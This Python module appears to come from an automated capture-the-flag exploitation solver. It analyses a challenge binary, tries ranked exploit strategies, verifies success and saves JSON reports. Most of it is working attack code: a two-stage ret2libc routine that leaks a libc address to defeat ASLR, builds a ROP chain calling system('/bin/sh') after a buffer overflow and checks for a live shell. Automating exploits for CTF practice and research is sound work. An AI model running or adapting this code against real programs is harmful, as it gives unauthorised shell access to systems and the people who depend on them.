"""编排：静态事实 -> 策略排序 -> 逐条尝试 -> 验证 -> 落盘报告。"""
from __future__ import annotations

import json
import os
import time
import traceback
from dataclasses import dataclass, field
from typing import Optional

from .facts import Facts, analyse
from .model import Challenge
from .run import Result, execute, execute_flag
from . import strategies as S


@dataclass
class Attempt:
    strategy: str
    desc: str
    ok: bool
    elapsed: float
    output: bytes = b""
    error: str = ""

    def brief(self) -> dict:
        return {
            "strategy": self.strategy,
            "desc": self.desc,
            "ok": self.ok,
            "elapsed": round(self.elapsed, 2),
            "tail": self.output[-300:].decode("latin-1", "replace"),
        }


@dataclass
class SolveResult:
    name: str
    ok: bool
    strategy: str = ""
    detail: str = ""
    elapsed: float = 0.0
    attempts: list[Attempt] = field(default_factory=list)
    facts: dict = field(default_factory=dict)
    error: str = ""
    flag_only: bool = False

    def as_dict(self) -> dict:
        return {
            "name": self.name,
            "ok": self.ok,
            "strategy": self.strategy,
            "detail": self.detail,
            "elapsed": round(self.elapsed, 1),
            "attempt_count": len(self.attempts),
            "flag_only": self.flag_only,
            "facts": self.facts,
            "attempts": [a.brief() for a in self.attempts],
            "error": self.error,
        }


def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
          budget: float = 240.0) -> SolveResult:
    t0 = time.time()
    res = SolveResult(name=ch.name, ok=False)
    try:
        ch.prepare()
    except Exception:
        res.error = traceback.format_exc(limit=2)
        res.elapsed = time.time() - t0
        return res

    f = analyse(ch)
    res.facts = {
        "prot": ch.prot.as_dict(),
        "vulns": [str(v) for v in f.vulns[:6]],
        "wins": [str(w) for w in f.wins[:6]],
        "binsh": hex(f.binsh) if f.binsh else None,
        "gadgets": {k: hex(v) for k, v in f.gadgets.items()},
        "csu": bool(f.csu),
        "mmap_rwx": hex(f.mmap_rwx) if f.mmap_rwx else None,
        "fmt_buf": f.fmt_buf,
        "libc": os.path.basename(ch.libc_path) if ch.libc_path else None,
        "notes": ch.notes,
    }
    if verbose:
        print(f"    prot={ch.prot} vulns={len(f.vulns)} wins={len(f.wins)} "
              f"binsh={hex(f.binsh) if f.binsh else None} csu={bool(f.csu)} "
              f"mmap_rwx={hex(f.mmap_rwx) if f.mmap_rwx else None} "
              f"fmt={f.fmt_buf} gadgets={len(f.gadgets)}")

    tried = 0
    deadline = t0 + budget
    for strat in S.STRATEGIES:
        if time.time() > deadline:
            res.error = "budget exhausted"
            break
        try:
            plans = list(strat(ch, f))
        except Exception:
            continue
        if not plans:
            continue
        if verbose:
            print(f"    -> {strat.__name__}: {len(plans)} plans")
        for plan in plans:
            if tried >= max_attempts or time.time() > deadline:
                res.elapsed = time.time() - t0
                return res
            tried += 1
            t1 = time.time()
            if plan.tag == "flag":
                r = execute_flag(ch, plan.sends)
                ok, detail, out = r.ok, r.note, r.output
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
            elif plan.tag.startswith("stage1:"):
                ok, detail, out = _try_ret2libc(ch, f, plan)
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
            else:
                r = execute(ch, plan.sends)
                if not r.ok and r.error:
                    # 进程提前退出属于时序抖动，重试一次
                    r = execute(ch, plan.sends)
                ok, detail, out = r.ok, "", r.output
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, r.output, r.error)
            res.attempts.append(att)
            if ok:
                res.ok = True
                if plan.tag == "flag":
                    res.flag_only = True
                res.strategy = plan.strategy
                res.detail = detail or plan.desc
                res.elapsed = time.time() - t0
                if verbose:
                    print(f"    [OK] {att.strategy} {att.desc} ({att.elapsed:.2f}s)")
                return res
    res.elapsed = time.time() - t0
    return res


# --------------------------------------------------------------------------- ret2libc
def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan):
    """同一进程内两阶段：泄漏 libc -> 回 main -> system('/bin/sh')。

    注意：stage2 必须复用 stage1 的进程，否则 ASLR 变了，算出来的地址全废。
    """
    import time as _t
    from .run import spawn, verify_shell

    _, _, meta = plan.tag.partition(":")
    leak_name, off_s, sink = (meta.split(":") + ["", ""])[:3]
    libc = ch.libc_elf
    if libc is None:
        return False, "no libc", b""
    off = int(off_s)

    try:
        p = spawn(ch)
    except Exception as exc:
        return False, f"spawn failed: {exc}", b""

    out = b""
    try:
        _t.sleep(0.1)
        out += p.recvrepeat(0.08)
        p.send(plan.sends[-1])
        _t.sleep(0.25)
        out += p.recvrepeat(0.25)

        base = _find_libc_base(out, libc, leak_name)
        if base is None:
            return False, "leak failed", out

        system = base + libc.sym["system"]
        try:
            binsh = base + next(libc.search(b"/bin/sh"))
        except StopIteration:
            return False, "no /bin/sh in libc", out

        if ch.elf.bits == 64:
            pop_rdi = f.gadgets.get("pop_rdi")
            if not pop_rdi:
                return False, "no pop rdi", out
            chains = [ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system)]
            if f.gadgets.get("ret"):
                chains.append(ch.p64(f.gadgets["ret"]) + ch.p64(pop_rdi)
                              + ch.p64(binsh) + ch.p64(system))
        else:
            chains = [ch.p32(system) + ch.p32(0) + ch.p32(binsh)]

        detail = f"libc_base={hex(base)} system={hex(system)} binsh={hex(binsh)}"
        for chain in chains:
            stage2 = b"A" * off + chain + (b"\n" if sink in S.TERM_SINKS else b"")
            try:
                p.send(stage2)
            except Exception:
                break
            _t.sleep(0.2)
            out += p.recvrepeat(0.15)
            r = verify_shell(p)
            out += r.output
            if r.ok:
                return True, detail, out
        return False, "stage2 failed: " + detail, out
    finally:
        try:
            p.close()
        except Exception:
            pass


def _find_libc_base(out: bytes, libc, name: str) -> Optional[int]:
    sym = int(libc.sym.get(name, 0) or 0)
    if not sym:
        return None
    bits64 = libc.bits == 64
    lo, hi = (0x700000000000, 0x800000000000) if bits64 else (0xE0000000, 0x100000000)
    low12 = sym & 0xFFF
    for p in range(len(out)):
        for ln in ((6, 8) if bits64 else (4,)):
            chunk = out[p:p + ln]
            if len(chunk) < 4:
                continue
            v = int.from_bytes(chunk.ljust(8, b"\x00"), "little") if bits64 \
                else int.from_bytes(chunk.ljust(4, b"\x00")[:4], "little")
            if (v & 0xFFF) != low12:
                continue
            base = v - sym
            if lo <= base < hi and base % 0x1000 == 0:
                return base
    return None


def solve_many(paths: list[str], out_dir: str, **kw) -> list[SolveResult]:
    os.makedirs(out_dir, exist_ok=True)
    results = []
    for p in paths:
        ch = Challenge(p)
        print(f"[*] {ch.name}: {ch.bin_src}")
        res = solve(ch, **kw)
        results.append(res)
        status = "SOLVED" if res.ok else "FAILED"
        print(f"    => {status} {res.strategy} {res.detail} ({res.elapsed:.1f}s, "
              f"{len(res.attempts)} attempts)")
        with open(os.path.join(out_dir, f"{ch.name}.json"), "w", encoding="utf-8") as fh:
            json.dump(res.as_dict(), fh, ensure_ascii=False, indent=2)
    return results
